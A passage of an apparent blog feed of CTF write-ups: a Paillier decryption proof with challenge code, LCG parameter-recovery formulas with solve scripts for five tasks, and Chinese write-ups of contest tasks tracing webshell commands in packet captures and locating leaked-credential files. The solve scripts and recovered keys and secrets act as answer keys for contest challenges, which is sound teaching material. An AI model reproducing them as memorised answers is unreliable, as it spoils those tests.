<p>$$<br>(L(g^{m\lambda} \mod n^{2})\cdot \mu) \mod n<br>$$ {eq3}</p>
<ul>
<li>make some deductions about $g^{m\lambda}$</li>
</ul>
<p>$$<br>g^{m\lambda} \equiv (n + 1)^{m\lambda} \mod n^{2}<br>$$</p>
<p>$$<br>\Longrightarrow g^{m\lambda} \equiv 1 + mn\lambda \mod n^{2}<br>$$</p>
<ul>
<li>substitute $g^{m\lambda}$ into $eq3$</li>
</ul>
<p>$$<br>L(1 + mn\lambda)\cdot \mu \mod n \equiv m\lambda \mu \mod n<br>$$</p>
<p>as $\lambda &#x3D; (p-1)(q-1) &#x3D; \varphi(n)$ and $\mu \equiv \varphi(n)^{-1}\mod n$, we will get that:<br>$$<br>m \varphi(n)\cdot \varphi(n)^{-1} \equiv m \mod n<br>$$<br><strong>Proved.</strong> </p>
<h1 id="EXERCISE"><a href="#EXERCISE" class="headerlink" title="EXERCISE"></a>EXERCISE</h1><h2 id="FIRST"><a href="#FIRST" class="headerlink" title="FIRST"></a>FIRST</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line"><span class="keyword">assert</span> gcd(p*q, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)) == <span class="number">1</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n = &#x27;</span> + <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line">g = random.randint(<span class="number">1</span>, n*n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;g = &#x27;</span> + <span class="built_in">str</span>(g))</span><br><span class="line">r = random.randint(<span class="number">1</span>, n)</span><br><span class="line"><span class="keyword">assert</span> gcd(r, n) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = (<span class="built_in">pow</span>(g, m, n*n) * <span class="built_in">pow</span>(r, n, n*n)) % (n*n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n, g, c</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="SECOND"><a href="#SECOND" class="headerlink" title="SECOND"></a>SECOND</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag, p, q</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">g = n + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n = &#x27;</span> + <span class="built_in">str</span>(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;g = &#x27;</span> + <span class="built_in">str</span>(g))</span><br><span class="line"></span><br><span class="line">r = random.randint(<span class="number">1</span>, n)</span><br><span class="line"><span class="keyword">assert</span> gcd(r, n) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = (<span class="built_in">pow</span>(g, m, n*n) * <span class="built_in">pow</span>(r, n, n*n)) % (n*n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n, g, c</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>



<p>Follow the <strong>PROOF</strong>, and we can write scripts to decrypt. </p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>fermat_little_theorem</tag>
        <tag>proof</tag>
        <tag>ruler</tag>
      </tags>
  </entry>
  <entry>
    <title>LCGs</title>
    <url>/2023/06/27/LCGs/</url>
    <content><![CDATA[<p>The LCG algorithm is applied to the generation of pseudo random numbers.<br>$$<br>X_{n + 1} \equiv (a X_{n} + b) \mod m<br>$$</p>
<p>The LCG defines three variables——multiplier a, increment b, and modulus m, which decide the generator. </p>
<span id="more"></span><!--toc-->

<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><blockquote>
<p><a href="https://blog.csdn.net/superprintf/article/details/108964563">ctf-lcg</a></p>
</blockquote>
<h1 id="Solving-Formula"><a href="#Solving-Formula" class="headerlink" title="Solving Formula"></a>Solving Formula</h1><table>
<thead>
<tr>
<th>targets</th>
<th>formulae</th>
</tr>
</thead>
<tbody><tr>
<td>$X_{n+1} \rightarrow X_{n}$</td>
<td>$X_{n}\equiv a^{-1}(X_{n+1} - b) \mod m$</td>
</tr>
<tr>
<td>$\rightarrow a$</td>
<td>$a \equiv (X_{n+2} - X_{n+1})(X_{n+1} - X_{n})^{-1} \mod m$</td>
</tr>
<tr>
<td>$\rightarrow b$</td>
<td>$b \equiv (X_{n+1} - X_{n}) \mod m$</td>
</tr>
<tr>
<td>$\rightarrow m$</td>
<td>$t_{n} &#x3D; X_{n + 1} - X_{n}$</td>
</tr>
<tr>
<td></td>
<td>$m &#x3D; gcd((t_{n+1}\cdot t_{n-1} - t_n\cdot t_n), (t_n\cdot t_{n-2} - t_{n-1}\cdot t_{n-1}))$</td>
</tr>
</tbody></table>
<h1 id="Proofs"><a href="#Proofs" class="headerlink" title="Proofs"></a>Proofs</h1><h2 id="formula-1"><a href="#formula-1" class="headerlink" title="formula 1"></a>formula 1</h2><p>$$<br>X_{n+1} \equiv a X_{n} + b \mod m<br>$$</p>
<p>$$<br>aX_{n} \equiv X_{n+1} - b \mod m<br>$$</p>
<p>$$<br>X_{n} \equiv a^{-1} (X_{n+1} - b) \mod m<br>$$</p>
<p>How to calculate $a^{-1}$? We can use <code>Extended Euclidean algorithm</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">MMI = <span class="keyword">lambda</span> A, n,s=<span class="number">1</span>,t=<span class="number">0</span>,N=<span class="number">0</span>: (n &lt; <span class="number">2</span> <span class="keyword">and</span> t%N <span class="keyword">or</span> MMI(n, A%n, t, s-A//n*t, N <span class="keyword">or</span> n),-<span class="number">1</span>)[n&lt;<span class="number">1</span>]</span><br><span class="line"><span class="comment"># &lt;==&gt; MMI = lambda a, n: gmpy2.gcdext(a, n)[1]</span></span><br><span class="line"><span class="comment"># &lt;==&gt; gmpy2.invert(a, n)</span></span><br></pre></td></tr></table></figure>



<h2 id="formula-2"><a href="#formula-2" class="headerlink" title="formula 2"></a>formula 2</h2><p>$$<br>X_{n + 2} \equiv aX_{n + 1} + b \mod m<br>$$</p>
<p>$$<br>X_{n+1} \equiv aX_{n} + b \mod m<br>$$</p>
<p>$$<br>X_{n+2} - X_{n+1} \equiv a(X_{n + 1} - X_{n}) \mod m<br>$$</p>
<p>$$<br>a \equiv (X_{n+2} - X_{n+1})(X_{n+1} - X_{n})^{-1} \mod m<br>$$</p>
<h2 id="formula-3"><a href="#formula-3" class="headerlink" title="formula 3"></a>formula 3</h2><p>$$<br>X_{n + 1} \equiv aX_{n} + b \mod m<br>$$</p>
<p>$$<br>b \equiv X_{n+1} - aX_{n} \mod m<br>$$</p>
<h2 id="formula-4"><a href="#formula-4" class="headerlink" title="formula 4"></a>formula 4</h2><p>Define that $t_n \equiv X_{n +1} - X_{n} \mod m$.<br>$$<br>t_n \equiv (aX_{n} + b) - (aX_{n-1} + b) \mod m<br>$$</p>
<p>$$<br>t_n \equiv a(X_{n} - X_{n-1}) \mod m<br>$$</p>
<p>$$<br>\Longrightarrow t_n \equiv at_{n-1} \mod m<br>$$</p>
<p>Thus, we can make the deduction by followings.<br>$$<br>t_{n+1}\cdot t_{n-1} - t_{n}\cdot t_{n} \mod m<br>$$</p>
<p>$$<br>\rightarrow a\cdot t_{n} \cdot a^{-1} \cdot t_{n} - t_n\cdot t_n \mod m<br>$$</p>
<p>$$<br>\Longrightarrow 0 \mod m<br>$$</p>
<p>$$<br>\Longrightarrow t_{n+1}\cdot t_{n-1} - t_{n}\cdot t_{n} | m<br>$$</p>
<p>Similarly, it can be concluded that $t_{n}\cdot t_{n-2} - t_{n-1}\cdot t_{n-1} | m$<br>$$<br>\Longrightarrow m &#x3D; gcd ((t_{n+1}\cdot t_{n-1} - t_{n}\cdot t_{n}), (t_{n}\cdot t_{n-2} - t_{n-1}\cdot t_{n-1}))<br>$$</p>
<h1 id="Applications"><a href="#Applications" class="headerlink" title="Applications"></a>Applications</h1><h2 id="lcg-1"><a href="#lcg-1" class="headerlink" title="lcg_1"></a>lcg_1</h2><h3 id="task"><a href="#task" class="headerlink" title="task"></a>task</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;***********************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = <span class="number">33477128523140105764301644224721378964069</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;seed = &quot;</span>,seed)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">ciphertext = seed^plaintext</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a = &quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b = &quot;</span>,b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span>,ciphertext)</span><br></pre></td></tr></table></figure>

<h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><p><strong>known:</strong> </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">seed = (a * seed + b) % n</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">n</span><br><span class="line">---<span class="number">10</span>---&gt; seed</span><br><span class="line">ciphertext = seed ^ plaintext</span><br><span class="line"></span><br><span class="line">=&gt; plaintext = ciphertext ^ seed</span><br></pre></td></tr></table></figure>

<p><strong>exp:</strong> </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">seed = </span><br><span class="line">a = </span><br><span class="line">b = </span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed + b) % n</span><br><span class="line">plaintext = seed ^ c</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(plaintext))</span><br></pre></td></tr></table></figure>

<h2 id="lcg-2"><a href="#lcg-2" class="headerlink" title="lcg_2"></a>lcg_2</h2><h3 id="task-1"><a href="#task-1" class="headerlink" title="task"></a>task</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;*****************************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">ciphertext = seed</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a = &quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b = &quot;</span>,b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span>,ciphertext)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h3><p><strong>known:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">seed = plaintext</span><br><span class="line">seed = (a * seed + b) % n</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">n</span><br><span class="line">---<span class="number">10</span>---&gt; seed</span><br><span class="line">ciphertext = seed</span><br><span class="line"></span><br><span class="line">use formula <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><strong>exp:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a_ = invert(a, n)</span><br><span class="line"></span><br><span class="line">seed = c</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a_ * (seed - b)) % n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(seed))</span><br></pre></td></tr></table></figure>



<h2 id="lcg-3"><a href="#lcg-3" class="headerlink" title="lcg_3"></a>lcg_3</h2><h3 id="task-2"><a href="#task-2" class="headerlink" title="task"></a>task</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;*********************&#125;&#x27;</span></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">seed = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">b = plaintext</span><br><span class="line"></span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">    output.append(seed)</span><br><span class="line">ciphertext = seed</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a = &quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output1 = &quot;</span>,output[<span class="number">6</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output2 = &quot;</span>,output[<span class="number">7</span>])</span><br></pre></td></tr></table></figure>

<h3 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h3><p><strong>known:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a</span><br><span class="line">n</span><br><span class="line">output = (a * seed + b) % n</span><br><span class="line">	-&gt; output1 = output[<span class="number">6</span>]</span><br><span class="line">	-&gt; output2 = output[<span class="number">7</span>]</span><br><span class="line">b = plaintext</span><br></pre></td></tr></table></figure>

<p><strong>exp:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># formula 3</span></span><br><span class="line">b = (output2 - a*output1) % n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(b))</span><br></pre></td></tr></table></figure>



<h2 id="lcg-4"><a href="#lcg-4" class="headerlink" title="lcg_4"></a>lcg_4</h2><h3 id="task-3"><a href="#task-3" class="headerlink" title="task"></a>task</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;********************************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = plaintext</span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">    output.append(seed)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output = &quot;</span>,output)</span><br></pre></td></tr></table></figure>

<h3 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h3><p><strong>known:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n</span><br><span class="line">seed = (a * seed + b) % n   ---&gt; output</span><br></pre></td></tr></table></figure>

<p><strong>target:</strong> </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">to solve out a, b</span><br><span class="line">a  &lt;---  formula <span class="number">2</span></span><br><span class="line">b  &lt;---  formula <span class="number">3</span></span><br></pre></td></tr></table></figure>



<p><strong>exp:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># solve out a</span></span><br><span class="line">a = invert(output[<span class="number">1</span>] - output[<span class="number">0</span>], n) * (output[<span class="number">2</span>] - output[<span class="number">1</span>]) % n</span><br><span class="line">a_ = invert(a, n)</span><br><span class="line"><span class="comment"># solve out b</span></span><br><span class="line">b = (output[<span class="number">1</span>] - a * output[<span class="number">0</span>]) % n</span><br><span class="line"><span class="comment"># solve out the initial seed</span></span><br><span class="line">plaintext = a_ * (output[<span class="number">0</span>] - b) % n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(plaintext))</span><br></pre></td></tr></table></figure>



<h2 id="lcg-5"><a href="#lcg-5" class="headerlink" title="lcg_5"></a>lcg_5</h2><h3 id="task-4"><a href="#task-4" class="headerlink" title="task"></a>task</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;****************************************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = plaintext</span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">    output.append(seed)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output = &quot;</span>,output)</span><br></pre></td></tr></table></figure>



<h3 id="solution-4"><a href="#solution-4" class="headerlink" title="solution"></a>solution</h3><p><strong>known:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">seed = (a * seed + b) % n   ---&gt; output</span><br></pre></td></tr></table></figure>

<p><strong>target:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">to solve out a, b, m</span><br><span class="line"></span><br><span class="line">m  &lt;--- formula <span class="number">4</span></span><br><span class="line">a  &lt;--- formula <span class="number">2</span></span><br><span class="line">b  &lt;--- formula <span class="number">3</span></span><br></pre></td></tr></table></figure>

<p><strong>exp:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># solve out n</span></span><br><span class="line">t = [output[i + <span class="number">1</span>] - output[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output) - <span class="number">1</span>)]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">return</span> t[i + <span class="number">1</span>] * t[i - <span class="number">1</span>] - t[i] * t[i]</span><br><span class="line"></span><br><span class="line">ns = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output) - <span class="number">3</span>):</span><br><span class="line">    ns.append(<span class="built_in">int</span>(gcd(T(i), T(i+<span class="number">1</span>))))</span><br><span class="line">    <span class="comment"># print(ns)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> ns:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># solve out a</span></span><br><span class="line">        a = invert(output[<span class="number">1</span>] - output[<span class="number">0</span>], n) * (output[<span class="number">2</span>] - output[<span class="number">1</span>]) % n</span><br><span class="line">        a_ = invert(a, n)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># solve out b</span></span><br><span class="line">        b = (output[<span class="number">1</span>] - a * output[<span class="number">0</span>]) % n</span><br><span class="line"></span><br><span class="line">        <span class="comment"># solve out the initial seed</span></span><br><span class="line">        plaintext = a_ * (output[<span class="number">0</span>] - b) % n</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(plaintext))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>



<h2 id="lcg-6"><a href="#lcg-6" class="headerlink" title="lcg_6"></a>lcg_6</h2><h3 id="task-5"><a href="#task-5" class="headerlink" title="task"></a>task</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;*****************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = plaintext</span><br><span class="line"></span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (seed*a+b)%n</span><br><span class="line">    output.append(seed&gt;&gt;<span class="number">64</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a = &quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b = &quot;</span>,b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output = &quot;</span>,output)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>lcg</tag>
        <tag>recursion</tag>
      </tags>
  </entry>
  <entry>
    <title>MISC-Write-Up-Zh</title>
    <url>/2023/03/09/MISC-Write-Up-zh/</url>
    <content><![CDATA[<p>As a routine notepad to record some recurrent tasks in Chinese.</p>
<p>These tasks are somewhat special or interesting, which deserve recording. </p>
<span id="more"></span><!--toc-->

<h1 id="2022首届数据安全大赛-SQLPacket"><a href="#2022首届数据安全大赛-SQLPacket" class="headerlink" title="[2022首届数据安全大赛]SQLPacket"></a>[2022首届数据安全大赛]SQLPacket</h1><h2 id="SQLPacket-1"><a href="#SQLPacket-1" class="headerlink" title="SQLPacket.1"></a>SQLPacket.1</h2><p><strong>题干信息：</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230814103402110.png" class="" title="image-20230814103402110">

<p><strong>解题：</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230814110938970.png" class="" title="image-20230814110938970">

<p>追踪的路径：</p>
<ul>
<li>协议分级，定位<code>http</code></li>
<li>查看对象，<code>HTTP</code>，发现存在<code>cmd=ls</code>等信息</li>
<li>过滤数据，<code>http contains &quot;cmd=ls&quot;</code></li>
<li>右击过滤HTTP流</li>
<li>发现<code>secret1687456.txt</code></li>
</ul>
<h2 id="SQLPacket-2"><a href="#SQLPacket-2" class="headerlink" title="SQLPacket.2"></a>SQLPacket.2</h2><p><strong>题干信息：</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230814111422124.png" class="" title="image-20230814111422124">

<p><strong>解密：</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230814134745903.png" class="" title="image-20230814134745903">

<ul>
<li>url解码</li>
<li>base64解密</li>
</ul>
<p>得到如下信息：</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230814135224798.png" class="" title="image-20230814135224798">

<p>可得，密钥为<code>05c1cc9c2deafb75</code>，采用<code>AES128</code>加密。</p>
<p>到tq 197。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230814135834691.png" class="" title="image-20230814135834691">

<ul>
<li>AES解密</li>
<li>base64解码</li>
</ul>
<p>得到如下信息：</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230814135946111.png" class="" title="image-20230814135946111">

<p>追踪HTTP流，使用返回包进行求解。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230814140206008.png" class="" title="image-20230814140206008">

<p><em>直接在notepad++中进行转换</em></p>
<ul>
<li>base64解码</li>
<li>hex -&gt; ascii 转换</li>
</ul>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230814140513980.png" class="" title="image-20230814140513980">

<p>从而得到<code>secret1</code>，即为<code>ae1690a2-8e67-421e-bdcd-c4510995da98</code>。</p>
<h1 id="2022首届数据安全大赛-账密泄密追踪"><a href="#2022首届数据安全大赛-账密泄密追踪" class="headerlink" title="[2022首届数据安全大赛]账密泄密追踪"></a>[2022首届数据安全大赛]账密泄密追踪</h1><img src="/2023/03/09/MISC-Write-Up-zh/image-20230808132623943.png" class="" title="image-20230808132623943">

<h2 id="账密泄密追踪-1"><a href="#账密泄密追踪-1" class="headerlink" title="账密泄密追踪.1"></a>账密泄密追踪.1</h2><p><strong>题干信息：</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808132730673.png" class="" title="image-20230808132730673">

<p><strong>解题：</strong></p>
<p>直接在GitHub上搜索<code>green berry</code>。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808132934566.png" class="" title="image-20230808132934566">

<p>进入项目中，使用泄露的五个账号依次查找，从而找到了泄露文件位置。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808133348918.png" class="" title="image-20230808133348918">

<p>该url为<code>https://github.com/Tristan-Hao/Green-Berry/blob/main/scrubbers.py</code>。</p>
<h2 id="账密泄密追踪-2"><a href="#账密泄密追踪-2" class="headerlink" title="账密泄密追踪.2"></a>账密泄密追踪.2</h2><p><strong>题干信息：</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808134339166.png" class="" title="image-20230808134339166">

<p><strong>解题：</strong></p>
<p>因为在gitee平台，利用<code>qingmei</code>进行查找，发现该项目。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808134528131.png" class="" title="image-20230808134528131">

<p>进入项目，进行查找。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808134847640.png" class="" title="image-20230808134847640">

<p>该url为<code>https://gitee.com/datasecurity-qunzhong/qing-mei-login/blob/master/scrubbers.py</code>。</p>
<h2 id="账密泄密追踪-3"><a href="#账密泄密追踪-3" class="headerlink" title="账密泄密追踪.3"></a>账密泄密追踪.3</h2><p><strong>题干信息：</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808135119209.png" class="" title="image-20230808135119209">

<p><strong>解题：</strong></p>
<p>凡是还得登录以及必须手机号注册的东西，我告辞。</p>
<p>网上截图。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808140304612.png" class="" title="image-20230808140304612">

<p>以及识别url后得到<code>https://www.yuque.com/shuanxiaoming/gsx1eb/efnpu3</code>。</p>
<h2 id="账密泄密追踪-4"><a href="#账密泄密追踪-4" class="headerlink" title="账密泄密追踪.4"></a>账密泄密追踪.4</h2><p><strong>题干信息：</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808140927064.png" class="" title="image-20230808140927064">

<p><strong>解密：</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808141004301.png" class="" title="image-20230808141004301">

<p>得到泄露url，<code>https://zhuanlan.zhihu.com/p/521587651</code>。</p>
<h2 id="账密泄露追踪-5"><a href="#账密泄露追踪-5" class="headerlink" title="账密泄露追踪.5"></a>账密泄露追踪.5</h2><p><strong>题干信息：</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808141435317.png" class="" title="image-20230808141435317">

<p><strong>解题：</strong></p>
<p>在CSDN上，利用关键词<code>青莓</code>进行查找。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808141713409.png" class="" title="image-20230808141713409">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808141920605.png" class="" title="image-20230808141920605">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808141638834.png" class="" title="image-20230808141638834">

<p>得到两个泄露url。</p>
